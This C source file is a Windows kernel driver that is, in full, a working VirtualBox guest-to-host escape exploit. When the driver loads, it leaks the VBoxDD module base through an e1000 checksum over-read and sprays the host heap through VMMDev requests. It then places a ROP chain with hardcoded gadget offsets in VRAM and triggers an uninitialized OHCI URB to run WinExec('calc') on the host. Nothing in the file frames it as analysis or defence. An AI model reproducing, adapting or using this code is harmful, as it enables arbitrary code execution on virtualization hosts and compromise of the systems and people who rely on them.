#include "Header.h"

DRIVER_INITIALIZE DriverEntry;
_Dispatch_type_(IRP_MJ_CREATE)
_Dispatch_type_(IRP_MJ_CLOSE)
DRIVER_DISPATCH SioctlCreateClose;
_Dispatch_type_(IRP_MJ_DEVICE_CONTROL)
DRIVER_DISPATCH SioctlDeviceControl;
DRIVER_UNLOAD SioctlUnloadDriver;

#define E1K_IOPORT_BASE	0xd000
#define VRAM_GUEST_BASE	0xe0000000
#define VRAM_SIZE		0x8000000
#define OHCI_MMIO_BASE	0xF0808000
#define OHCI_MMIO_SIZE	0x1000

uint8_t* ohci_mmio_va = NULL;

uint32_t old_HcHCCA = 0;
uint32_t old_HcControl = 0;

uint64_t guess_vram_host_addr = 0x10000000;

bool exploit();

PDRIVER_OBJECT GLOBAL_DRIVER_OBJECT;
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT   DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	NTSTATUS        ntStatus;
	UNICODE_STRING  ntUnicodeString;
	UNICODE_STRING  ntWin32NameString;
	PDEVICE_OBJECT  deviceObject = NULL;

	GLOBAL_DRIVER_OBJECT = DriverObject;

	UNREFERENCED_PARAMETER(RegistryPath);

	RtlInitUnicodeString(&ntUnicodeString, NT_DEVICE_NAME);

	ntStatus = IoCreateDevice(DriverObject, 0, &ntUnicodeString, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &deviceObject);

	if (!NT_SUCCESS(ntStatus))
	{
		DbgPrint(("[-] Couldn't create the device object\n"));
		return ntStatus;
	}

	DriverObject->MajorFunction[IRP_MJ_CREATE] = SioctlCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = SioctlCreateClose;
	DriverObject->DriverUnload = SioctlUnloadDriver;

	RtlInitUnicodeString(&ntWin32NameString, DOS_DEVICE_NAME);
	ntStatus = IoCreateSymbolicLink(&ntWin32NameString, &ntUnicodeString);
	if (!NT_SUCCESS(ntStatus))
	{
		DbgPrint(("[-] Couldn't create symbolic link\n"));
		IoDeleteDevice(deviceObject);
	}

	DbgPrint("[+] Start Vbox Exploit!!");
	exploit();

	return ntStatus;
}

NTSTATUS SioctlCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	PAGED_CODE();

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

VOID SioctlUnloadDriver(_In_ PDRIVER_OBJECT DriverObject)
{
	PDEVICE_OBJECT deviceObject = DriverObject->DeviceObject;
	UNICODE_STRING uniWin32NameString;

	PAGED_CODE();

	RtlInitUnicodeString(&uniWin32NameString, DOS_DEVICE_NAME);

	IoDeleteSymbolicLink(&uniWin32NameString);

	if (deviceObject != NULL)
	{
		IoDeleteDevice(deviceObject);
	}
}

void kernel_sleep(int t)
{
	LARGE_INTEGER Timeout;
	Timeout.QuadPart = RELATIVE(MILLISECONDS(t));

	KeDelayExecutionThread(KernelMode, TRUE, &Timeout);
}

uint64_t compare(const void* a, const void* b)
{
	return (*(uint64_t*)a - *(uint64_t*)b);
}

uint64_t mostFrequent(uint64_t arr[], int n)
{
	// Sort the array 
	qsort(arr, n, sizeof(uint64_t), compare);

	// find the max frequency using linear traversal 
	uint64_t max_count = 1, res = arr[0], curr_count = 1;
	for (int i = 1; i < n; i++) {
		if (arr[i] == arr[i - 1])
			curr_count++;
		else {
			if (curr_count > max_count) {
				max_count = curr_count;
				res = arr[i - 1];
			}
			curr_count = 1;
		}
	}

	// If last element is most frequent 
	if (curr_count > max_count)
	{
		max_count = curr_count;
		res = arr[n - 1];
	}

	return res;
}

uint64_t get_physical_address(uint64_t address)
{
	return MmGetPhysicalAddress(address).QuadPart;
}

uint32_t ohci_get_register(uint32_t index)
{
	return ((uint32_t*)ohci_mmio_va)[index];
}

void ohci_set_register(uint32_t index, uint32_t value)
{
	((uint32_t*)ohci_mmio_va)[index] = value;
}

PVOID alloc_DWORD_phys_addr(uint32_t size)
{
	PHYSICAL_ADDRESS max;
	max.QuadPart = 0xffffffff;
	PVOID result = MmAllocateContiguousMemory(size, max);
	return result;
}

PVOID alloc_QWORD_phys_addr(uint32_t size)
{
	PHYSICAL_ADDRESS max;
	max.QuadPart = 0xffffffffffffffff;
	PVOID result = MmAllocateContiguousMemory(size, max);
	return result;
}

VMMDevRequestHeader* vmmdev_request = NULL;
uint32_t vmmdev_request_pa = 0;
uint32_t max_vmmdev_request_size = 0x10000;

void vmmdev_sendrequest(uint8_t* buf, uint32_t size)
{
	if (size >= sizeof(VMMDevRequestHeader) && size < max_vmmdev_request_size)
	{
		if (!vmmdev_request)
		{
			// Allocate VMMDev Request
			vmmdev_request = (VMMDevRequestHeader*)alloc_DWORD_phys_addr(max_vmmdev_request_size);
			vmmdev_request_pa = MmGetPhysicalAddress(vmmdev_request).LowPart;
		}

		if (vmmdev_request)
		{
			// Init VMMDev Request
			memcpy(vmmdev_request, buf, size);
			vmmdev_request->size = size;
			vmmdev_request->version = VMMDEV_REQUEST_HEADER_VERSION;
			vmmdev_request->requestType = VMMDevReq_ReportGuestInfo2;
			vmmdev_request->rc = 0;

			// Send VMMDev Request
			ASMOutU32(0xd020, vmmdev_request_pa);

			// Wait VMMDev Request
			uint32_t rc = vmmdev_request->rc;
			while (rc != 0xfffffffe)
			{
				rc = vmmdev_request->rc;
			}
		}
	}
	else
	{
		DbgPrint("[-] size is too small: 0x%x", size);
	}
}

uint32_t uninit_buffer_size = 0x84bc;
uint32_t thread_running = true;
void heapspray_thread()
{
	KeSetSystemAffinityThreadEx(1);

	uint64_t* spray_buffer = (uint64_t*)alloc_DWORD_phys_addr(max_vmmdev_request_size);
	if (spray_buffer)
	{
		// Fill the spray buffer with guess_vram_host_addr
		for (int i = 0; i < max_vmmdev_request_size / sizeof(uint64_t); i++)
		{
			spray_buffer[i] = guess_vram_host_addr >> 24;
		}

		// Keep allocate spray buffer
		while (thread_running)
		{
			vmmdev_sendrequest(spray_buffer, uninit_buffer_size);
			kernel_sleep(1);
		}
	}

	DbgPrint("[+] heapspray_thread Exit");
}

HANDLE create_heapspray_thread()
{
	KeSetSystemAffinityThreadEx(0);

	HANDLE threadHandle;
	NTSTATUS status = PsCreateSystemThread(&threadHandle, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, heapspray_thread, GLOBAL_DRIVER_OBJECT);

	return threadHandle;
}

int64_t Kernel32_offset_ReadFile = 0x22410;
int64_t Kernel32_offset_WinExec = 0x5E800;

uint64_t VBoxDD_ReadFile_offset = 0x131040;
uint64_t VBoxDD_e1000_offset = 0x168308;

uint64_t gadget_xchg_eax_esp = 0x0010cc1;               // xchg eax, esp ; ret
uint64_t gadget_xchg_eax_ebp = 0x007dbc;                // xchg eax, ebp ; ret
uint64_t gadget_addRSP0x108_popRDI = 0x00d364c;         // add rsp, 0x108 ; pop rsi ; pop rbx ; ret

uint64_t gadget_pushRAX_popRDX = 0x0b466f;              // push rax ; pop rdx ; ret
uint64_t gadget_popRAX = 0x0a9b19;                      // pop rax ; ret
uint64_t gadget_popRCX = 0x0099eb9;                     // pop rcx ; and bh, bh ; ret
uint64_t gadget_addRAX_RCX = 0x10c416;                  // add rax, rcx ; ret

uint64_t gadget_movRAX_ptrRCX = 0x0fa9ae;               // mov rax, qword ptr [rcx] ; ret
uint64_t gadget_movPtrRAX8_RDX = 0x0118040;             // mov qword ptr [rax + 8], rdx ; ret

uint8_t* vram_va = NULL;

bool prepare_vram(uint64_t VBoxDD_BaseAddress)
{
	PHYSICAL_ADDRESS vram_pa;
	vram_pa.QuadPart = VRAM_GUEST_BASE;

	if (!vram_va)
	{
		vram_va = (PVOID)MmMapIoSpace(vram_pa, VRAM_SIZE, MmNonCached);
	}

	uint64_t* start = vram_va;
	uint64_t size = VRAM_SIZE / 8;

	for (uint64_t i = 0; i < size; i += 0x200)
	{
		for (int j = 0; j < 0x200; j++)
		{
			start[i + j] = guess_vram_host_addr;
		}

		uint64_t* current_block = &start[i];

		//PUT WinExec() Arg
		memcpy(&start[i] + 0x20, "calc", 5);

		//RSP += 0x108
		current_block[0] = VBoxDD_BaseAddress + gadget_addRSP0x108_popRDI;

		//STACK PIVOT
		current_block[0x1b] = VBoxDD_BaseAddress + gadget_xchg_eax_esp;

		uint32_t idx = 0x24;

		//backup RSP
		current_block[idx++] = VBoxDD_BaseAddress + gadget_xchg_eax_ebp;

		// RAX = ReadFile()
		current_block[idx++] = VBoxDD_BaseAddress + gadget_popRCX;
		current_block[idx++] = VBoxDD_BaseAddress + VBoxDD_ReadFile_offset;
		current_block[idx++] = VBoxDD_BaseAddress + gadget_movRAX_ptrRCX;

		// RAX = Kernel32 Base
		current_block[idx++] = VBoxDD_BaseAddress + gadget_popRCX;
		current_block[idx++] = -Kernel32_offset_ReadFile;
		current_block[idx++] = VBoxDD_BaseAddress + gadget_addRAX_RCX;

		//RAX = WinExec()
		current_block[idx++] = VBoxDD_BaseAddress + gadget_popRCX;
		current_block[idx++] = Kernel32_offset_WinExec;
		current_block[idx++] = VBoxDD_BaseAddress + gadget_addRAX_RCX;

		//RDX = WinExec()
		current_block[idx++] = VBoxDD_BaseAddress + gadget_pushRAX_popRDX;

		//RAX = RSP - 0x10
		current_block[idx++] = VBoxDD_BaseAddress + gadget_popRAX;
		current_block[idx++] = 0;
		current_block[idx++] = VBoxDD_BaseAddress + gadget_xchg_eax_ebp;
		current_block[idx++] = VBoxDD_BaseAddress + gadget_popRCX;
		current_block[idx++] = -0x10;
		current_block[idx++] = VBoxDD_BaseAddress + gadget_addRAX_RCX;

		//[RAX + 8] = RDX
		current_block[idx++] = VBoxDD_BaseAddress + gadget_movPtrRAX8_RDX;

		//RAX = RSP + 0x8
		current_block[idx++] = VBoxDD_BaseAddress + gadget_popRCX;
		current_block[idx++] = 0x8;
		current_block[idx++] = VBoxDD_BaseAddress + gadget_addRAX_RCX;

		//RCX = "calc"
		current_block[idx++] = VBoxDD_BaseAddress + gadget_popRCX;
		current_block[idx++] = guess_vram_host_addr + 0x100;

		//WinExec("calc")
		current_block[idx++] = VBoxDD_BaseAddress + gadget_xchg_eax_esp;
	}
	return true;
}

void ohci_software_reset()
{
	ohci_set_register(HcCommandStatus, OHCI_STATUS_HCR);
	ohci_set_register(HcControl, old_HcControl);
}

bool trigger_ohci_uninitialized_urb(uint32_t new_pExtra_size)
{
	OHCIED* Ed = alloc_DWORD_phys_addr(sizeof(OHCIED));
	OHCIED* hcca = alloc_DWORD_phys_addr(sizeof(OHCIED));
	OHCITD* Td = alloc_DWORD_phys_addr(sizeof(OHCITD));
	VUSBSETUP* pSetupIn = alloc_DWORD_phys_addr(new_pExtra_size);

	uint32_t pExtra_header_size = 0x14bc;

	if (Ed && hcca && Td && pSetupIn)
	{
		memset(pSetupIn, 0, new_pExtra_size);

		// Reset the device 
		ohci_set_register(HcControl, old_HcControl);
		ohci_set_register(HcHCCA, 0);
		ohci_set_register(HcRhPortStatus_0, OHCI_PORT_PRS | OHCI_PORT_CLRSS);
		ohci_software_reset();

		// Reset wait
		kernel_sleep(3000);
		{
			// Init the ED, TD and setup packet
			pSetupIn->wLength = new_pExtra_size - pExtra_header_size;
			pSetupIn->bmRequestType = VUSB_DIR_TO_HOST;

			Ed->HeadP = get_physical_address(Td);
			Ed->hwinfo = 0xc0000;
			Ed->NextED = NULL;
			Ed->TailP = NULL;

			Td->hwinfo = 0x21000000;
			Td->NextTD = NULL;
			Td->cbp = get_physical_address(pSetupIn);
			Td->be = Td->cbp + 0x1000;

			// Submit the URB
			ohci_set_register(HcControlHeadED, get_physical_address(Ed));
			ohci_set_register(HcCommandStatus, OHCI_STATUS_CLF);
			ohci_set_register(HcHCCA, get_physical_address(hcca));
		}
		// Submit URB wait
		kernel_sleep(5000);

		MmFreeContiguousMemory(Ed);
		MmFreeContiguousMemory(Td);
		MmFreeContiguousMemory(pSetupIn);
		MmFreeContiguousMemory(hcca);

		return true;
	}

	return false;
}

bool control_eip()
{
	create_heapspray_thread();

	//Wait Heap Spray
	kernel_sleep(1000);

	return trigger_ohci_uninitialized_urb(uninit_buffer_size);
}

void e1k_reg_set(uint32_t register_offset, uint32_t value)
{
	int16_t IOADDR = E1K_IOPORT_BASE;
	int16_t IODATA = E1K_IOPORT_BASE + 4;
	ASMOutU32(IOADDR, register_offset);
	ASMOutU32(IODATA, value);
}

uint32_t e1k_reg_get(uint32_t register_offset)
{
	int16_t IOADDR = E1K_IOPORT_BASE;
	int16_t IODATA = E1K_IOPORT_BASE + 4;
	ASMOutU32(IOADDR, register_offset);
	return ASMInU32(IODATA);
}

uint32_t get_overread_checksums(uint16_t cse1, uint16_t cse2)
{
	bool rc = true;
	uint16_t first_crc = 0, second_crc = 0;
	uint32_t rx_desc_num = 0x100;
	uint32_t frame_size = 0x10;
	uint8_t cso = 2;

	uint8_t* frame_content = alloc_QWORD_phys_addr(frame_size);
	if (frame_content)
	{
		// Mark our sent frame with 0x6161
		memset(frame_content, 0x61, frame_size);
		E1KRXDESC* RX_descriptors = alloc_QWORD_phys_addr(sizeof(E1KRXDESC) * rx_desc_num);
		if (RX_descriptors)
		{
			memset(RX_descriptors, 0, sizeof(E1KRXDESC) * rx_desc_num);
			PHYSICAL_ADDRESS RX_descriptors_pa, frame_content_pa;
			RX_descriptors_pa = MmGetPhysicalAddress(RX_descriptors);

			// Wait until current transmitions finished
			while (e1k_reg_get(E1K_REG_TDH) != e1k_reg_get(E1K_REG_TDT));

			// Backup some RX related register
			uint32_t old_RDBAL = e1k_reg_get(E1K_REG_RDBAL);
			uint32_t old_RDBAH = e1k_reg_get(E1K_REG_RDBAH);
			uint32_t old_RDH = e1k_reg_get(E1K_REG_RDH);
			uint32_t old_RDT = e1k_reg_get(E1K_REG_RDT);

			{
				{
					uint32_t tx_descnum = 4;
					E1KTXDESC* TX_descriptors = alloc_QWORD_phys_addr(sizeof(E1KTXDESC) * tx_descnum);
					if (TX_descriptors)
					{
						memset(TX_descriptors, 0, sizeof(E1KTXDESC) * tx_descnum);
						PHYSICAL_ADDRESS TX_descriptors_pa, frame_content_pa;
						TX_descriptors_pa = MmGetPhysicalAddress(TX_descriptors);
						frame_content_pa = MmGetPhysicalAddress(frame_content);

						// Backup some TX related registers
						uint32_t old_TDBAL = e1k_reg_get(E1K_REG_TDBAL);
						uint32_t old_TDBAH = e1k_reg_get(E1K_REG_TDBAH);
						uint32_t old_TDH = e1k_reg_get(E1K_REG_TDH);
						uint32_t old_TDT = e1k_reg_get(E1K_REG_TDT);

						{
							// Init the TX descriptors to send 2 frame with over cse
							TX_descriptors[0].context.dw2.u4DTYP = E1K_DTYP_CONTEXT;
							TX_descriptors[0].context.dw2.fDEXT = 1;
							TX_descriptors[0].context.dw2.fTSE = 0;
							TX_descriptors[0].context.dw3.u8HDRLEN = 0x3e;
							TX_descriptors[0].context.dw3.u16MSS = frame_size;
							TX_descriptors[0].context.dw2.u20PAYLEN = frame_size;
							TX_descriptors[0].context.ip.u8CSS = 0;
							TX_descriptors[0].context.ip.u8CSO = cso;
							TX_descriptors[0].context.ip.u16CSE = cse1;

							TX_descriptors[1].data.u64BufAddr = frame_content_pa.QuadPart;
							TX_descriptors[1].data.cmd.u4DTYP = E1K_DTYP_DATA;
							TX_descriptors[1].data.cmd.fDEXT = 1;
							TX_descriptors[1].data.cmd.fTSE = 0;
							TX_descriptors[1].data.cmd.fEOP = 1;
							TX_descriptors[1].data.cmd.u20DTALEN = frame_size;
							TX_descriptors[1].data.dw3.fIXSM = 1;
							TX_descriptors[1].data.dw3.fTXSM = 1;

							TX_descriptors[2].context.dw2.u4DTYP = E1K_DTYP_CONTEXT;
							TX_descriptors[2].context.dw2.fDEXT = 1;
							TX_descriptors[2].context.dw2.fTSE = 0;
							TX_descriptors[2].context.dw3.u8HDRLEN = 0x3e;
							TX_descriptors[2].context.dw3.u16MSS = frame_size;
							TX_descriptors[2].context.dw2.u20PAYLEN = frame_size;
							TX_descriptors[2].context.ip.u8CSS = 0;
							TX_descriptors[2].context.ip.u8CSO = cso;
							TX_descriptors[2].context.ip.u16CSE = cse2;

							TX_descriptors[3].data.u64BufAddr = frame_content_pa.QuadPart;
							TX_descriptors[3].data.cmd.u4DTYP = E1K_DTYP_DATA;
							TX_descriptors[3].data.cmd.fDEXT = 1;
							TX_descriptors[3].data.cmd.fTSE = 0;
							TX_descriptors[3].data.cmd.fEOP = 1;
							TX_descriptors[3].data.cmd.u20DTALEN = frame_size;
							TX_descriptors[3].data.dw3.fIXSM = 1;
							TX_descriptors[3].data.dw3.fTXSM = 1;

							// Enable Loopback mode
							e1k_reg_set(E1K_REG_RCTL, (RCTL_LBM_TCVR << RCTL_LBM_SHIFT));

							// Setup RX
							e1k_reg_set(E1K_REG_RDBAL, RX_descriptors_pa.LowPart);
							e1k_reg_set(E1K_REG_RDBAH, RX_descriptors_pa.HighPart);
							e1k_reg_set(E1K_REG_RDH, 0);
							e1k_reg_set(E1K_REG_RDT, rx_desc_num);

							// Setup TX
							e1k_reg_set(E1K_REG_TDBAL, TX_descriptors_pa.LowPart);
							e1k_reg_set(E1K_REG_TDBAH, TX_descriptors_pa.HighPart);
							e1k_reg_set(E1K_REG_TDH, 0);
							e1k_reg_set(E1K_REG_TDT, tx_descnum);

							// Wait TX
							uint32_t c = 0;
							while (e1k_reg_get(E1K_REG_TDH) < tx_descnum)
							{
								if (c++ > 1000)
								{
									rc = false;
									break;
								}
							}
						}

						// Restore TX register
						e1k_reg_set(E1K_REG_TDBAL, old_TDBAL);
						e1k_reg_set(E1K_REG_TDBAH, old_TDBAH);
						e1k_reg_set(E1K_REG_TDH, old_TDH);
						e1k_reg_set(E1K_REG_TDT, old_TDT);

						MmFreeContiguousMemory(TX_descriptors);
					}
				}

				if (rc)
				{
					// Wait RX
					uint32_t c = 0;
					while (e1k_reg_get(E1K_REG_RDH) < 2)
					{
						if (c++ > 1000)
						{
							rc = false;
							break;
						}
					}

					if (rc)
					{
						// Read the RX list
						E1KRXDESC* result_rx_desc = NULL;
						result_rx_desc = (E1KRXDESC*)MmMapIoSpace(RX_descriptors_pa, sizeof(E1KRXDESC) * rx_desc_num, MmNonCached);
						PHYSICAL_ADDRESS result_rx_desc_pa[2] = { 0 };

						result_rx_desc_pa[0].QuadPart = result_rx_desc[0].u64BufAddr;
						result_rx_desc_pa[1].QuadPart = result_rx_desc[1].u64BufAddr;

						// Read the sent frames from the RX list
						uint16_t* rx_frame[2] = { 0 };
						rx_frame[0] = (PVOID)MmMapIoSpace(result_rx_desc_pa[0], 0x100, MmNonCached);
						rx_frame[1] = (PVOID)MmMapIoSpace(result_rx_desc_pa[1], 0x100, MmNonCached);

						// Make sure the frame in the RX list is our sent frames
						if (rx_frame[0][2] == 0x6161 && rx_frame[1][2] == 0x6161)
						{
							// Read the checksum from cso offset
							first_crc = rx_frame[0][cso / sizeof(uint16_t)];
							second_crc = rx_frame[1][cso / sizeof(uint16_t)];
						}
					}
				}
			}

			// Restore RX registers
			e1k_reg_set(E1K_REG_RDBAL, old_RDBAL);
			e1k_reg_set(E1K_REG_RDBAH, old_RDBAH);
			e1k_reg_set(E1K_REG_RDH, old_RDH);
			e1k_reg_set(E1K_REG_RDT, old_RDT);

			MmFreeContiguousMemory(RX_descriptors);
		}

		MmFreeContiguousMemory(frame_content);
	}

	return first_crc ^ (second_crc << 16);
}

uint16_t crc16_add_word(uint16_t base, uint16_t add)
{
	uint32_t csum = (~base) & 0xffff;

	csum += add;
	csum = (csum >> 16) + (csum & 0xFFFF);
	return ~csum;
}

uint64_t crc16_get_distance(uint16_t base, uint16_t add)
{
	uint16_t result = (~add) - (~base);
	if ((~add) < (~base))
		result -= 1;
	return result;
}

uint64_t try_leak_vboxdd()
{
	uint32_t vboxdd_ptr_offset = E1K_MAX_TX_PKT_SIZE + 0x1f7;
	uint16_t crc_difference = 0x5a;
	uint64_t leaked_vboxdd_pointer = 0;

	// The 64bit Module address is only 6 bytes long, so we only need to leak 3 words
	for (int i = 0; i < 3; i++)
	{
		uint32_t checksums = 0;

		// Sometime get_overread_checksums() return wrong checksum, I just run it 10 times until 
		// we got a value that make sense.
		for (int j = 0; j < 10; j++)
		{
			checksums = get_overread_checksums(vboxdd_ptr_offset + i * 2, vboxdd_ptr_offset + i * 2 + 2);
			if (checksums > 0x10000)
				break;
		}
		uint16_t first_crc = checksums & 0xffff;
		uint16_t second_crc = checksums >> 16;

		// Add the difference to the first checksum
		first_crc = crc16_add_word(first_crc, crc_difference);

		// Calculate the leaked word value from the overread checksum
		leaked_vboxdd_pointer |= (crc16_get_distance(first_crc, second_crc) << (i * 16));
	}

	return leaked_vboxdd_pointer;
}

uint64_t info_leak()
{
	// Since the information leakage is not so stable, sometime it return a wrong pointer
	// so I'll try to leak the address a few times then choose the most frequent one.
	uint64_t result_list[10];
	for (int i = 0; i < 10; i++)
	{
		result_list[i] = try_leak_vboxdd();
		DbgPrint("0x%llx", result_list[i]);
	}

	return mostFrequent(result_list, 10);
}

bool exploit()
{
	uint64_t VBoxDD_BaseAddress = info_leak() - VBoxDD_e1000_offset;
	DbgPrint("[+] VBoxDD Module Base Address: 0x%llx", VBoxDD_BaseAddress);

	if ((VBoxDD_BaseAddress & 0xfff) != 0)
		return false;

	if (prepare_vram(VBoxDD_BaseAddress))
	{
		// Map OHCI MMIO to ohci_mmio_va
		PHYSICAL_ADDRESS ohci_mmio_pa;
		ohci_mmio_pa.QuadPart = OHCI_MMIO_BASE;

		ohci_mmio_va = (PVOID)MmMapIoSpace(ohci_mmio_pa, OHCI_MMIO_SIZE, MmNonCached);
		if (ohci_mmio_va)
		{
			DbgPrint("[+] Mapped OHCI MMIO %p!\n", ohci_mmio_va);

			// Backup Control Registers
			old_HcHCCA = ohci_get_register(HcHCCA);
			old_HcControl = ohci_get_register(HcControl);

			return control_eip();
		}
	}

	return false;
}
